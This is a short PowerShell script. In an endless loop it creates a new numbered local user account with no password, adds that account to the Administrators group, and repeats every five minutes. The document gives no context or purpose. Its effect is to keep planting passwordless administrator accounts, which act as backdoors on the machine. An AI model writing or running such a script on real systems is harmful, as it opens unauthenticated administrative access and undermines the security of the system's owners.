$number = "1"

while ($true) {
    $username = $number + "user"
    New-LocalUser -Name $username -Description $username -NoPassword
    Add-LocalGroupMember -Group "Administrators" -Member $username
    $numbery = [int]$number + 1
    $number = [string]$numbery
    Start-Sleep -Seconds 300
  }